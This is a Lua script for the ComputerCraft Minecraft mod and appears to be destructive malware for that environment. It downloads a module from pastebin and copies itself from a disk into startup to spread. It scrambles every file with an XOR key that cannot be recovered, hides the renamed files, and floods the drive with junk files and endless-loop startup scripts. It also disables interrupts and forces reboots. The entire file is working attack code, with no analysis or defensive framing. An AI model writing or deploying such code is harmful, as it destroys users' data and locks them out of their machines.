settings.set("shell.allow_disk_startup",false)
settings.save()
if not fs.exists("strings42343264632456342") then
    shell.run("pastebin get FeHQyxZ8 strings42343264632456342")
end
local s = require("../strings42343264632456342")
if s.ensure_width(shell.getRunningProgram(), 4) == "disk" then
    if not fs.exists("startup.lua") then
        fs.copy("disk/startup", "startup.lua")
    end
end
if not fs.exists("startup") then
    fs.makeDir("startup")
end
local function filess(seed, inside)
    local res = {}
    math.randomseed(seed)
    for i = 1, #inside do
        res[i] = bit32.bxor(math.random(0, 255), inside:byte(i))
    end
    return string.char(unpack(res))
end
math.randomseed(math.random(0, 100000000))
local files = fs.list("./")
if #fs.list("./") < 1000 then
    for i = 1, #files do
        if files[i] ~= "startup.lua" and files[i] ~= "startup" and files[i] ~= "strings" and not fs.isDir(files[i]) then
            local rf = fs.open(files[i], "r")
            local rd = filess(math.random(1,100000000), rf.readAll())
			math.randomseed(math.random(0, 100000000))
            rf.close()
            local rf = fs.open(files[i], "w")
            rf.write(rd)
            rf.close()
            fs.move(files[i], "." .. tostring(math.random(0, 10000000)))
        end
    end
    for i = 1, 1500 do
        local random = math.random(1, 10000000)
        local ran2 = math.random(0, 1)
        math.randomseed(random)
        if fs.getFreeSpace(".") > 1000 then
            if ran2 == 1 then
                if not fs.exists(tostring(random)) then
                    local file = fs.open("." .. tostring(random), "w")
                    file.close()
                end
            else
                if not fs.exists(tostring(random)) then
                    local f = fs.open("startup/" .. "." .. tostring(random), "w")
                    f.writeLine(
                        "while true do print(math.random(0,100000000000000)..math.random(0,100000000000000)) end"
                    )
                    f.close()
                end
            end
        else
        end
    end
end
_G.os.pullEvent = function()
    return "nope"
end
local files = fs.list("startup")
for i = 1, #files do
    shell.run("startup/" .. files[i])
end
os.reboot()
